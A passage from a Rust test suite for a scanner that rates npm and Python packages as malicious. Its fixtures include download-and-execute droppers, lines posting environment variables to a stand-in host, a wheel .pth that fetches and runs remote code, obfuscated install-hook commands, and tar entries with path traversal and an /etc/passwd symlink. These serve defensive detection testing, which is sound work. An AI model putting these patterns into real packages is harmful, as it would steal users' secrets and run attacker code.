        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    assert!(!analysis
        .malicious_indicators
        .risk_reasons
        .join(";")
        .contains("malicious"));

    // The answer a client sees names the release and marks the dependency rows.
    let client = client().await;
    let summary = summary(&client, "analyze_npm_package", &dir.path().join("dep")).await;
    assert!(
        summary["risk"]["reasons"]
            .to_string()
            .contains("known malicious release"),
        "{summary}"
    );
    assert!(summary["dependencies"]["known_malicious_releases"]
        .to_string()
        .contains("event-stream@3.3.6"));
    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": dir.path().join("dep"), "section": "dependencies"}),
    )
    .await;
    assert!(!is_error, "{text}");
    let page: Value = serde_json::from_str(&text).unwrap();
    assert!(page["known_malicious_releases"]
        .to_string()
        .contains("node-ipc@10.1.1"));
    assert!(page["items"]
        .as_array()
        .unwrap()
        .iter()
        .any(|row| row["name"] == "node-ipc" && row["known_malicious_release"] == true));
    client.cancel().await.unwrap();
}

#[test]
fn a_python_dependency_on_a_malicious_release_rates_high() {
    let dir = TempDir::new().unwrap();
    let release = py_malicious();
    let name = release.first().expect("table has malicious packages");
    let path = write(
        dir.path(),
        "requirements.txt",
        format!("{name}\nrequests\n").as_bytes(),
    );
    let analysis = analyze_python_package(&path).unwrap();
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    assert!(analysis
        .malicious_indicators
        .risk_reasons
        .join(";")
        .contains("known malicious release"));
}

#[test]
fn a_suspected_typosquat_rates_at_least_medium_and_the_famous_name_stays_clean() {
    for (name, famous) in [("lodahs", "lodash"), ("axioss", "axios")] {
        let manifest = format!(r#"{{"name":"{name}","version":"1.0.0"}}"#);
        let dir = r6_npm_dir(&[
            ("package.json", &manifest),
            ("index.js", "module.exports = 1;\n"),
        ]);
        let analysis = analyze_npm_package(dir.path()).unwrap();
        assert!(
            analysis
                .malicious_indicators
                .typosquatting_risk
                .is_potential_typosquatting
        );
        assert!(
            matches!(
                analysis.malicious_indicators.risk_level,
                NpmRisk::Medium | NpmRisk::High | NpmRisk::Critical
            ),
            "{name}: {:?}",
            analysis.malicious_indicators.risk_level
        );
        let manifest = format!(r#"{{"name":"{famous}","version":"1.0.0"}}"#);
        let dir = r6_npm_dir(&[
            ("package.json", &manifest),
            ("index.js", "module.exports = 1;\n"),
        ]);
        let analysis = analyze_npm_package(dir.path()).unwrap();
        assert!(
            !analysis
                .malicious_indicators
                .typosquatting_risk
                .is_potential_typosquatting
        );
        // (The famous package's own old versions carry advisories, so only the name is judged.)
        assert!(
            !analysis
                .malicious_indicators
                .risk_reasons
                .iter()
                .any(|r| r.contains("resembles")),
            "{famous}: {:?}",
            analysis.malicious_indicators.risk_reasons
        );
    }
    let dir = TempDir::new().unwrap();
    for (name, flagged) in [("reqeusts", true), ("requests", false)] {
        let path = write(
            dir.path(),
            &format!("{name}/setup.py"),
            format!("from setuptools import setup\nsetup(name='{name}', version='2.31.0')\n")
                .as_bytes(),
        );
        let analysis = analyze_python_package(path.parent().unwrap()).unwrap();
        assert_eq!(
            analysis
                .malicious_indicators
                .typosquatting_risk
                .is_potential_typosquatting,
            flagged,
            "{name}"
        );
        if flagged {
            assert!(
                !matches!(
                    analysis.malicious_indicators.risk_level,
                    PyRisk::Safe | PyRisk::Low
                ),
                "{:?}",
                analysis.malicious_indicators.risk_level
            );
        }
    }
}

/// A tar header with a name written as is, `..` and absolute paths included.
fn r6_raw_header(name: &[u8], kind: tar::EntryType, size: u64, link: Option<&[u8]>) -> tar::Header {
    let mut h = tar::Header::new_gnu();
    {
        let gnu = h.as_gnu_mut().unwrap();
        gnu.name[..name.len()].copy_from_slice(name);
        if let Some(link) = link {
            gnu.linkname[..link.len()].copy_from_slice(link);
        }
    }
    h.set_entry_type(kind);
    h.set_size(size);
    h.set_mode(0o644);
    h.set_cksum();
    h
}

fn r6_unsafe_extras() -> Vec<(tar::Header, Vec<u8>)> {
    let body = b"module.exports = 1;\n".to_vec();
    vec![
        (
            r6_raw_header(
                b"package/../../../escape.js",
                tar::EntryType::Regular,
                body.len() as u64,
                None,
            ),
            body.clone(),
        ),
        (
            r6_raw_header(
                b"/abs/evil.js",
                tar::EntryType::Regular,
                body.len() as u64,
                None,
            ),
            body,
        ),
        (
            r6_raw_header(
                b"package/link.js",
                tar::EntryType::Symlink,
                0,
                Some(b"/etc/passwd"),
            ),
            vec![],
        ),
    ]
}

#[test]
fn a_tarball_with_unsafe_entries_rates_high_and_lists_each_kind() {
    let dir = TempDir::new().unwrap();
    let npm = write(
        dir.path(),
        "trav-1.0.0.tgz",
        &tar_with(
            &[
                ("package/package.json", PKG.as_bytes()),
                ("package/index.js", b"module.exports = 1;\n"),
            ],
            &r6_unsafe_extras(),
        ),
    );
    let analysis = analyze_npm_package(&npm).unwrap();
    assert!(
        r6_high_npm(&analysis.malicious_indicators.risk_level),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    let rules: Vec<&str> = analysis
        .source_findings
        .iter()
        .map(|f| f.rule.as_str())
        .collect();
    for rule in [
        "Archive entry escapes the package directory",
        "Archive entry with an absolute path",
        "Symlink in a package archive",
    ] {
        assert!(rules.contains(&rule), "{rule} missing from {rules:?}");
    }
    let note = analysis.input.notes.join(" ");
    assert!(
        note.contains("/abs/evil.js") && note.contains("package/link.js -> /etc/passwd"),
        "{note}"
    );
    // The absolute path is shown as the archive spells it, and the link is a listed file.
    let listed: Vec<&str> = analysis
        .files_analysis
        .iter()
        .map(|f| f.file_path.as_str())
        .collect();
    assert!(listed.contains(&"/abs/evil.js"), "{listed:?}");
    assert!(listed.contains(&"package/link.js"), "{listed:?}");

    // The same for a Python sdist.
    let sdist = write(
        dir.path(),
        "p-1.0.tar.gz",
        &tar_with(
            &[(
                "p-1.0/setup.py",
                b"from setuptools import setup\nsetup(name='p', version='1.0')\n",
            )],
            &[(
                r6_raw_header(b"p-1.0/../../x.py", tar::EntryType::Regular, 1, None),
                b"x".to_vec(),
            )],
        ),
    );
    let analysis = analyze_python_package(&sdist).unwrap();
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::High | PyRisk::Critical
        ),
        "{:?}",
        analysis.malicious_indicators.risk_level
    );
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("UNSAFE ARCHIVE ENTRIES")));

    // An ordinary tarball has none of this.
    let clean = write(
        dir.path(),
        "clean-1.0.0.tgz",
        &tgz(&[
            ("package/package.json", PKG.as_bytes()),
            ("package/index.js", b"module.exports = 1;\n"),
        ]),
    );
    let analysis = analyze_npm_package(&clean).unwrap();
    assert!(analysis.input.notes.iter().all(|n| !n.contains("UNSAFE")));
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::Safe
    ));
}

#[test]
fn signals_and_counters_agree_with_the_findings() {
    // A High obfuscation finding sets the obfuscation signal; a credential file
    // posted over the network sets the exfiltration signal.
    let eval = "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n";
    let dir = r6_npm_dir(&[
        ("package.json", PKG),
        ("index.js", eval),
        ("steal.js", DROPPER_JS),
    ]);
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.category == "obfuscation" && f.severity == "High"));
    assert!(analysis.security_analysis.obfuscation_detected);
    assert!(analysis.security_analysis.data_exfiltration_risk);

    // Python: the counters include setup.py, as the files list marks it scanned.
    let dir = TempDir::new().unwrap();
    let setup = b"from setuptools import setup\nsetup(name='cnt', version='1.0')\n";
    let init = b"VALUE = 1\n";
    write(dir.path(), "setup.py", setup);
    write(dir.path(), "cnt/__init__.py", init);
    let analysis = analyze_python_package(dir.path()).unwrap();
    let marked = analysis
        .files_analysis
        .iter()
        .filter(|f| f.source_scanned)
        .count();
    assert_eq!(marked, 2);
    assert_eq!(analysis.input.files_scanned, marked);
    assert_eq!(analysis.input.bytes_scanned, setup.len() + init.len());
}

#[tokio::test]
async fn the_python_scripts_section_lists_modules_and_knows_a_dependency_list_has_no_setup() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "pkg/setup.py",
        b"import subprocess\nimport base64\nfrom setuptools import setup\nsubprocess.call(['make'])\nsetup(name='sp', version='1.0')\n",
    );
    let reqs = write(dir.path(), "reqs/requirements.txt", b"requests==2.31.0\n");
    let client = client().await;
    let (is_error, text) = call(
        &client,
        "analyze_python_package",
        json!({"package_path": dir.path().join("pkg"), "section": "scripts"}),
    )
    .await;
    assert!(!is_error, "{text}");
    let scripts: Value = serde_json::from_str(&text).unwrap();
    let modules: Vec<&str> = scripts["suspicious_imports"]
        .as_array()
        .unwrap()
        .iter()
        .map(|i| i["module_name"].as_str().unwrap())
        .collect();
    assert!(
        modules.contains(&"subprocess") && modules.contains(&"base64"),
        "{modules:?}"
    );
    assert!(!modules.contains(&"Process execution"), "{modules:?}");
    assert!(!scripts["dangerous_operations"]
        .as_array()
        .unwrap()
        .is_empty());

    let (is_error, text) = call(
        &client,
        "analyze_python_package",
        json!({"package_path": reqs, "section": "scripts"}),
    )
    .await;
    assert!(!is_error, "{text}");
    let scripts: Value = serde_json::from_str(&text).unwrap();
    assert!(scripts["setup_type"].is_null(), "{scripts}");
    assert!(scripts["note"]
        .as_str()
        .unwrap()
        .contains("no setup script"));
    client.cancel().await.unwrap();
}

#[tokio::test]
async fn the_tool_descriptions_scan_the_same_files_and_say_yara_needs_a_directory() {
    let client = client().await;
    let tools = client.list_all_tools().await.unwrap();
    let describe = |name: &str| {
        tools
            .iter()
            .find(|t| t.name == name)
            .and_then(|t| t.description.as_ref())
            .map(ToString::to_string)
            .unwrap()
    };
    let npm = describe("analyze_npm_package");
    let py = describe("analyze_python_package");
    for text in [&npm, &py] {
        for ext in [".js", ".mjs", ".tsx", ".py", ".pyw", ".pth", ".sh", ".ps1"] {
            assert!(text.contains(ext), "{ext} missing from: {text}");
        }
        assert!(text.contains("UNPACKED directory"), "{text}");
        assert!(!text.contains("yara_scan_file runs a rule over the package"));
    }
    client.cancel().await.unwrap();
}

#[test]
fn far_apart_or_minified_network_write_and_exec_code_stays_low() {
    let manifest = r#"{"name":"bundle-pkg","version":"1.0.0"}"#;
    // A bundle: a fetch near the top, a file write in the middle and a child
    // process at the end, thousands of lines apart, plus a Babel-style visitor.
    let filler = "  const value = compute(items, options);\n".repeat(5000);
    let bundle = format!(
        "const https = require('https');\nconst fs = require('fs');\nconst cp = require('child_process');\n\
https.get(url, cb);\n{filler}fs.writeFileSync(out, data);\n{filler}cp.execSync(command);\n\
const visitor = {{\n  Function(path) {{\n    path.skip();\n  }},\n}};\n\
// Function(offset: number) => number\nfunction make(a) {{ return new Function(a.name, body); }}\n"
    );
    // One minified line with every pattern in it.
    let minified = format!(
        "var a=require('https'),b=require('fs'),c=require('child_process');{}a.get(u,function(r){{b.writeFileSync(o,r);c.execSync(cmd)}});",
        "var x=1;".repeat(300)
    );
    // The environment handed to a child process beside an unrelated POST.
    let env_child = "const axios = require('axios');
const { execFileSync } = require('child_process');
function version(bin) {
  return execFileSync(bin, ['--version'], { env: Object.assign({}, process.env, { LANG: 'C' }) });
}
function report(url, data) {
  return axios.post(url, { body: data });
}
module.exports = { version, report };
";
    for (name, body) in [
        ("bundle", bundle),
        ("minified", minified),
        ("env to child", env_child.to_string()),
    ] {
        let dir = r6_npm_dir(&[("package.json", manifest), ("index.js", &body)]);
        let m = analyze_npm_package(dir.path())
            .unwrap()
            .malicious_indicators;
        assert!(
            matches!(m.risk_level, NpmRisk::Safe | NpmRisk::Low),
            "{name}: {:?} {:?}",
            m.risk_level,
            m.risk_reasons
        );
    }
    // The same statements close together, in order, are still a dropper.
    let close = "const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');
https.get(url, (res) => {
  const f = fs.createWriteStream(out);
  res.pipe(f);
  f.on('finish', () => exec('sh ' + out));
});
";
    assert!(r6_high_npm(&r6_npm_level(&[
        ("package.json", manifest),
        ("index.js", close)
    ])));
}

#[test]
fn python_helpers_that_fetch_write_and_spawn_far_apart_stay_low() {
    let filler = "    value = compute(items)\n".repeat(400);
    let lib = format!(
        "import os, subprocess, requests\n\
def download(url, path):\n    r = requests.get(url)\n    open(path, 'wb').write(r.content)\n{filler}\
def run(path):\n    subprocess.run([str(path), '--version'], env=os.environ)\n\
def report(url, data):\n    requests.post(url, json=data)\n\
def build(name):\n    os.system('svn checkout %s' % name)\n"
    );
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "pyproject.toml",
        b"[project]\nname = \"helper-lib\"\nversion = \"1.0.0\"\n",
    );
    write(dir.path(), "helper_lib/util.py", lib.as_bytes());
    let analysis = analyze_python_package(dir.path()).unwrap();
    assert!(
        matches!(
            analysis.malicious_indicators.risk_level,
            PyRisk::Safe | PyRisk::Low
        ),
        "{:?} {:?}",
        analysis.malicious_indicators.risk_level,
        analysis.malicious_indicators.risk_reasons
    );
}

#[test]
fn a_malicious_dependency_adds_to_a_package_with_high_source_findings() {
    let dropper = "const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');
https.get(url, (res) => {
  const f = fs.createWriteStream(out);
  res.pipe(f);
  f.on('finish', () => exec('sh ' + out));
});
";
    let plain = r#"{"name":"drop-pkg","version":"1.0.0"}"#;
    let with_dep =
        r#"{"name":"drop-pkg","version":"1.0.0","dependencies":{"event-stream":"3.3.6"}}"#;
    let score = |manifest: &str| {
        let dir = r6_npm_dir(&[("package.json", manifest), ("index.js", dropper)]);
        let m = analyze_npm_package(dir.path())
            .unwrap()
            .malicious_indicators;
        (m.risk_level, m.overall_risk_score)
    };
    let (alone, alone_score) = score(plain);
    let (combined, combined_score) = score(with_dep);
    assert!(matches!(alone, NpmRisk::High), "{alone:?}");
    assert!(matches!(combined, NpmRisk::Critical), "{combined:?}");
    assert!(combined_score > alone_score);

    // Python: the same with a setup script that downloads, writes and runs.
    let setup = "import subprocess, urllib.request
from setuptools import setup
urllib.request.urlretrieve(URL, '/tmp/x')
subprocess.call(['sh', '/tmp/x'])
setup(name='droppy', version='1.0.0'%DEPS%)
";
    let py_score = |deps: &str| {
        let dir = TempDir::new().unwrap();
        write(
            dir.path(),
            "setup.py",
            setup.replace("%DEPS%", deps).as_bytes(),
        );
        let m = analyze_python_package(dir.path())
            .unwrap()
            .malicious_indicators;
        (m.risk_level, m.overall_risk_score)
    };
    let (_, py_alone) = py_score("");
    let (py_level, py_combined) = py_score(", install_requires=['ctx==0.1.2']");
    assert!(matches!(py_level, PyRisk::Critical), "{py_level:?}");
    assert!(py_combined > py_alone);
}

// ---------------------------------------------------------------------------
// Round 7: package tools
// ---------------------------------------------------------------------------

fn r7_npm(files: &[(&str, &str)]) -> (NpmRisk, f32, Vec<String>) {
    let dir = r6_npm_dir(files);
    let m = analyze_npm_package(dir.path())
        .unwrap()
        .malicious_indicators;
    (m.risk_level, m.overall_risk_score, m.risk_reasons)
}

fn r7_py(files: &[(&str, &str)]) -> (PyRisk, f32, Vec<String>) {
    let dir = TempDir::new().unwrap();
    for (name, body) in files {
        write(dir.path(), name, body.as_bytes());
    }
    let m = analyze_python_package(dir.path())
        .unwrap()
        .malicious_indicators;
    (m.risk_level, m.overall_risk_score, m.risk_reasons)
}

fn is_high(level: &NpmRisk) -> bool {
    matches!(level, NpmRisk::High | NpmRisk::Critical)
}

#[test]
fn an_update_check_next_to_a_generic_runner_is_not_a_dropper() {
    let manifest = r#"{"name":"task-kit","version":"1.0.0"}"#;
    let cli = "const https = require('https');
const fs = require('fs');
const { spawn } = require('child_process');
function checkUpdate() {
  https.get('https://registry.example.invalid/task-kit/latest', (r) => {
    let d = ''; r.on('data', (c) => (d += c)); r.on('end', () => fs.writeFileSync('/tmp/task-kit-latest.json', d));
  });
}
function run(command, args) {
  return spawn(command, args, { stdio: 'inherit' });
}
module.exports = { checkUpdate, run };
";
    let (level, _, _) = r7_npm(&[("package.json", manifest), ("cli.js", cli)]);
    assert!(!is_high(&level), "{level:?}");
    // The real dropper: what was written is what is run.
    let dropper = "const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');
const out = '/tmp/payload.sh';
https.get('https://example.invalid/p.sh', (r) => {
  let d = ''; r.on('data', (c) => (d += c));
  r.on('end', () => {
    fs.writeFileSync(out, d);
    exec('sh ' + out);
  });
});
";
    let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", dropper)]);
    assert!(is_high(&level), "{level:?}");
    // Sharing the written path with the run is enough, with no shell named.
    let direct = "const https = require('https');
const fs = require('fs');
const { execFile } = require('child_process');
const dest = '/tmp/tool-bin';
https.get('https://example.invalid/b', (r) => {
  r.on('end', () => {
    fs.writeFileSync(dest, 'x');
    execFile(dest);
  });
});
";
    let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", direct)]);
    assert!(is_high(&level), "{level:?}");
    // `node:` module specifier in a generic runner is not an interpreter.
    let nodecp = cli
        .replace(
            "const { spawn } = require('child_process');",
            "const cp = require('node:child_process');",
        )
        .replace("return spawn(", "return cp.spawn(");
    let (level, _, _) = r7_npm(&[("package.json", manifest), ("cli.js", &nodecp)]);
    assert!(!is_high(&level), "{level:?}");
    // A destination variable called `name` still ties the write to the run.
    let named = "const https = require('https');
const fs = require('fs');
const cp = require('child_process');
const name = '/tmp/tool-bin';
https.get('https://example.invalid/b', (r) => {
  r.on('end', () => {
    fs.writeFileSync(name, 'x', { mode: 0o755 });
    cp.execFile(name);
  });
});
";
    let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", named)]);
    assert!(is_high(&level), "{level:?}");
}

#[test]
fn a_python_dropper_with_a_destination_called_path_is_still_found() {
    let dropper = "import os, subprocess, tempfile, urllib.request

def go(url):
    path = os.path.join(tempfile.gettempdir(), 'u.bin')
    urllib.request.urlretrieve(url, path)
    os.chmod(path, 0o755)
    subprocess.Popen([path])
";
    let (level, _, _) = r7_py(&[
        (
            "pyproject.toml",
            "[project]\nname = \"helperkit\"\nversion = \"1.0\"\n",
        ),
        ("helperkit/__init__.py", dropper),
    ]);
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?}"
    );
}

#[test]
fn a_dropper_that_keeps_its_destination_in_a_field_is_still_a_dropper() {
    // The destination is `self.path` / `this.path`: both words are common ones, and the
    // run names the same field.
    let py = "import os, subprocess, urllib.request

class Updater:
    def go(self, url):
        urllib.request.urlretrieve(url, self.path)
        os.chmod(self.path, 0o755)
        subprocess.Popen([self.path])
";
    let (level, _, reasons) = r7_py(&[
        (
            "pyproject.toml",
            "[project]\nname = \"selfpath\"\nversion = \"1.0\"\n",
        ),
        ("m/__init__.py", py),
    ]);
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?} {reasons:?}"
    );
    let js = "const https = require('https');
const fs = require('fs');
const cp = require('child_process');
class Updater {
  go(url) {
    https.get(url, (r) => {
      let d = ''; r.on('data', (c) => (d += c));
      r.on('end', () => { fs.writeFileSync(this.path, d, { mode: 0o755 }); cp.execFile(this.path); });
    });
  }
}
module.exports = Updater;
";
    let (level, _, reasons) = r7_npm(&[
        ("package.json", r#"{"name":"thispath","version":"1.0.0"}"#),
        ("index.js", js),
    ]);
    assert!(is_high(&level), "{level:?} {reasons:?}");
    // The destination is the same expression at the write and at the run, made of common
    // words only (`path.join(os.tmpdir(), name)`), in a file an install hook runs.
    let setup = "const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const cp = require('child_process');
const name = 'u-' + process.pid;
https.get('https://example.invalid/u', res => {
  let d = '';
  res.on('data', c => d += c);
  res.on('end', () => {
    fs.writeFileSync(path.join(os.tmpdir(), name), d, { mode: 0o755 });
    cp.execFile(path.join(os.tmpdir(), name));
  });
});
";
    let (level, _, reasons) = r7_npm(&[
        (
            "package.json",
            r#"{"name":"jointmp","version":"1.0.0","scripts":{"postinstall":"node scripts/setup.js"}}"#,
        ),
        ("index.js", "module.exports = {};\n"),
        ("scripts/setup.js", setup),
    ]);
    assert!(is_high(&level), "{level:?} {reasons:?}");
}

#[test]
fn the_way_child_process_is_imported_does_not_tie_a_generic_runner_to_a_write() {
    // TypeScript output and dynamic import spell the module `node:child_process`; the word
    // `node` there is not an interpreter being started.
    for (file, import) in [
        (
            "cli.js",
            "const cp = __importStar(require(\"node:child_process\"));",
        ),
        ("cli.mjs", "const cp = await import('node:child_process');"),
        ("cli2.js", "const cp = require('node:child_process');"),
    ] {
        let cli = format!(
            "const https = require('https');
const fs = require('fs');
{import}
function checkUpdate() {{
  https.get('https://registry.example.invalid/task-kit/latest', (r) => {{
    let d = ''; r.on('data', (c) => (d += c)); r.on('end', () => fs.writeFileSync('/tmp/task-kit-latest.json', d));
  }});
}}
function run(command, args) {{
  return cp.spawn(command, args, {{ stdio: 'inherit' }});
}}
module.exports = {{ checkUpdate, run }};
"
        );
        let (level, _, reasons) = r7_npm(&[
            ("package.json", r#"{"name":"task-kit","version":"1.0.0"}"#),
            (file, &cli),
        ]);
        assert!(!is_high(&level), "{import}: {level:?} {reasons:?}");
    }
}

#[test]
fn a_python_download_helper_and_a_run_helper_are_not_a_dropper() {
    let helper = "import subprocess, urllib.request

def fetch_index(dest):
    urllib.request.urlretrieve('https://example.invalid/index.json', dest)

def run(cmd):
    return subprocess.run(cmd)
";
    let (level, _, _) = r7_py(&[
        (
            "pyproject.toml",
            "[project]\nname = \"helperkit\"\nversion = \"1.0\"\n",
        ),
        ("helperkit/__init__.py", helper),
    ]);
    assert!(
        !matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?}"
    );
    let dropper = "import subprocess, urllib.request

def go(dest):
    urllib.request.urlretrieve('https://example.invalid/x', dest)
    subprocess.run([dest])
";
    let (level, _, _) = r7_py(&[
        (
            "pyproject.toml",
            "[project]\nname = \"helperkit\"\nversion = \"1.0\"\n",
        ),
        ("helperkit/__init__.py", dropper),
    ]);
    assert!(
        matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?}"
    );
}

#[test]
fn one_named_variable_next_to_a_url_is_configuration() {
    let manifest = r#"{"name":"envdemo","version":"1.0.0"}"#;
    for line in [
        "const base = process.env.API_URL || 'https://api.example.invalid/v2';",
        "const c = axios.create({ baseURL: process.env.BASE_URL });",
        "module.exports = () => fetch(process.env.SERVICE_URL + '/health');",
        "if (process.env.HTTPS_PROXY) agent = new Agent(process.env['HTTPS_PROXY']); // https://example.invalid/docs",
        "client.post('/v1/messages', { model: process.env.MODEL || 'default' });",
    ] {
        let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", line)]);
        assert!(!is_high(&level), "{line}: {level:?}");
    }
    for line in [
        "fetch('https://example.invalid/c', { method: 'POST', body: JSON.stringify(process.env) });",
        "axios.post('https://example.invalid/c', process.env);",
    ] {
        let (level, _, _) = r7_npm(&[("package.json", manifest), ("index.js", line)]);
        assert!(is_high(&level), "{line}: {level:?}");
    }
    let meta = "[project]\nname = \"envdemo\"\nversion = \"1.0\"\n";
    for line in [
        "import os, requests\nrequests.get(os.environ[\"SERVICE_URL\"] + \"/health\")",
        "import os, socket\nHOST = os.getenv(\"STATSD_HOST\", socket.gethostname())",
        "import os, urllib.request\nproxy = os.environ.get(\"HTTPS_PROXY\")  # urllib below",
    ] {
        let (level, _, _) = r7_py(&[("pyproject.toml", meta), ("envdemo/__init__.py", line)]);
        assert!(
            !matches!(level, PyRisk::High | PyRisk::Critical),
            "{line}: {level:?}"
        );
    }
    for line in [
        "import requests, os\nrequests.post('https://example.invalid/c', data=dict(os.environ))",
        "import requests, os\nrequests.post('https://example.invalid/c', json=os.environ.copy())",
    ] {
        let (level, _, _) = r7_py(&[("pyproject.toml", meta), ("envdemo/__init__.py", line)]);
        assert!(
            matches!(level, PyRisk::High | PyRisk::Critical),
            "{line}: {level:?}"
        );
    }
}

#[test]
fn a_decoded_command_in_a_file_a_hook_runs_is_high() {
    let hex = "require('child_process').exec(Buffer.from('6375726c202d73','hex').toString());\n";
    let hooked = r#"{"name":"obf-demo","version":"1.0.0","scripts":{"postinstall":"node i.js"}}"#;
    let (level, _, reasons) = r7_npm(&[("package.json", hooked), ("i.js", hex)]);
    assert!(is_high(&level), "{level:?}");
    assert!(
        reasons.iter().any(|r| r.contains("install-time")),
        "{reasons:?}"
    );
    // Char-code blob in a hook-run file: obfuscation alone counts there.
    let codes = "const s=String.fromCharCode(99,117,114,108,32,45,115,32,104,116,116,112,115);require('child_'+'process')['ex'+'ec'](s);\n";
    let (level, _, _) = r7_npm(&[("package.json", hooked), ("i.js", codes)]);
    assert!(is_high(&level), "{level:?}");
    // The same obfuscated file that no hook runs is not moved by the hook rule.
    let plain = r#"{"name":"obf-demo","version":"1.0.0"}"#;
    let blob =
        "var _0x4a2f=['a','b'];function _0x1b2c(i){return _0x4a2f[i];}module.exports=_0x1b2c;\n";
    let (level, _, _) = r7_npm(&[("package.json", plain), ("index.js", blob)]);
    assert!(!is_high(&level), "{level:?}");
    let (level, _, _) = r7_npm(&[("package.json", hooked), ("i.js", blob)]);
    assert!(is_high(&level), "{level:?}");

    // Python: a decoded string handed to os.system, also through __import__.
    for setup in [
        "from setuptools import setup\nimport base64, os\nos.system(base64.b64decode('Y3VybA==').decode())\nsetup(name='padutils', version='1.0')\n",
        "from setuptools import setup\n(lambda _: __import__('os').system(__import__('base64').b64decode(_).decode()))('Y3VybA==')\nsetup(name='padutils', version='1.0')\n",
    ] {
        let (level, _, _) = r7_py(&[("setup.py", setup)]);
        assert!(matches!(level, PyRisk::High | PyRisk::Critical), "{level:?}");
    }
    // An ordinary setup.py with a subprocess stays low.
    let ok = "from setuptools import setup\nimport subprocess\nsubprocess.check_call(['make'])\nsetup(name='okpkg', version='1.0')\n";
    let (level, _, _) = r7_py(&[("setup.py", ok)]);
    assert!(
        !matches!(level, PyRisk::High | PyRisk::Critical),
        "{level:?}"
    );
}

#[test]
fn install_hooks_are_followed_through_cd_variables_and_bare_paths() {
    let dropper = "const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');
const out = '/tmp/payload.sh';
https.get('https://example.invalid/p.sh', (r) => {
  r.on('end', () => {
    fs.writeFileSync(out, 'x');
    exec('sh ' + out);
  });
});
";
    let cases: [(&str, &str); 4] = [
        ("cd scripts && node setup.js", "scripts/setup.js"),
        (
            "NODE_ENV=production node lib/internal/post.js || true",
            "lib/internal/post.js",
        ),
        ("node scripts/setup", "scripts/setup.js"),
        ("node scripts", "scripts/index.js"),
    ];
    for (hook, file) in cases {
        let manifest = json!({
            "name": "hooked", "version": "1.0.0", "scripts": {"install": hook}
        })
        .to_string();
        let (level, _, reasons) = r7_npm(&[("package.json", manifest.as_str()), (file, dropper)]);
        assert!(is_high(&level), "{hook}: {level:?}");
        assert!(
            reasons.iter().any(|r| r.contains("install-time")),
            "{hook}: {reasons:?}"
        );
    }
    // A path that leaves the package is not followed.
    let manifest = json!({
        "name": "hooked", "version": "1.0.0", "scripts": {"install": "cd .. && node setup.js"}
    })
    .to_string();
    let (_, _, reasons) = r7_npm(&[("package.json", manifest.as_str()), ("setup.js", dropper)]);
    assert!(
        !reasons.iter().any(|r| r.contains("install-time")),
        "{reasons:?}"
    );
}

#[test]
fn a_known_malicious_python_release_is_named_with_its_version() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "requirements.txt", b"ctx==0.1.2\n");
    let analysis = analyze_python_package(&dir.path().join("requirements.txt")).unwrap();
    let list = &analysis
        .dependencies
        .vulnerability_summary
        .malicious_releases;
    assert_eq!(list, &vec!["ctx==0.1.2".to_string()]);
    assert!(
        analysis
            .malicious_indicators
            .risk_reasons
            .iter()
            .any(|r| r.contains("ctx==0.1.2")),
        "{:?}",
        analysis.malicious_indicators.risk_reasons
    );
}

#[tokio::test]
async fn package_next_steps_say_what_they_give_and_a_wheel_pth_is_named() {
    let client = client().await;
    // next_steps use `gives`, never `why`.
    let dir = r6_npm_dir(&[("package.json", PKG), ("index.js", "module.exports = 1;\n")]);
    let answer = summary(&client, "analyze_npm_package", dir.path()).await;
    for step in answer["next_steps"].as_array().unwrap() {
        assert!(
            step["gives"].is_string() && step.get("why").is_none(),
            "{step}"
        );
    }
    // A wheel that ships an executable .pth does not read as clean.
    let wheel = zip_of(&[
        (
            "boot-0.1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: boot\nVersion: 0.1.0\n",
        ),
        ("boot-0.1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n"),
        ("boot/__init__.py", b"X = 1\n"),
        (
            "zz_boot.pth",
            b"import urllib.request; exec(urllib.request.urlopen('https://example.invalid/s.py').read())\n",
        ),
    ]);
    let tmp = TempDir::new().unwrap();
    let path = write(tmp.path(), "boot-0.1.0-py3-none-any.whl", &wheel);
    let (is_error, text) = call(
        &client,
        "analyze_python_package",
        json!({"package_path": path, "section": "scripts"}),
    )
    .await;
    assert!(!is_error, "{text}");
    let view: Value = serde_json::from_str(&text).unwrap();
    let ops = view["dangerous_operations"].as_array().unwrap();
    assert!(!ops.is_empty(), "{view}");
    assert!(ops[0]["location"]
        .as_str()
        .unwrap()
        .starts_with("zz_boot.pth:1"));
    assert!(view["note"].as_str().unwrap().contains(".pth"));
    // A wheel without one still says it runs nothing.
    let clean = zip_of(&[
        (
            "ok-0.1.0.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: ok\nVersion: 0.1.0\n",
        ),
        ("ok-0.1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n"),
        ("ok/__init__.py", b"X = 1\n"),
    ]);
    let path = write(tmp.path(), "ok-0.1.0-py3-none-any.whl", &clean);
    let (_, text) = call(
        &client,
        "analyze_python_package",
        json!({"package_path": path, "section": "scripts"}),
    )
    .await;
